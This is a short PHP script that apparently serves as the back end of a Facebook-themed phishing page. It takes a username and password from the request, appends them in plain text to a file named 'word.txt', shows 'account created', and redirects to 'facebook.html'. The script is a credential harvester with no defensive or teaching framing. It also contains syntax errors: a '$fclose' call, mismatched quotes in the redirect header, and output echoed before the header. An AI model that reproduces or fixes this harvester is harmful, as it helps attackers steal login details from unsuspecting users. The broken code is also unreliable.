<?php
   $username = $_GET['name'];
   $password = $_GET['pwd'];
   $filename =  'word.txt';
   $fp = fopen($filename, 'a+');
   fwrite ($fp, $username . "," . $password . "\n");
   $fclose ($fp);
   echo ("account created");
   header("Location: "facebook.html");
   die();
   ?>
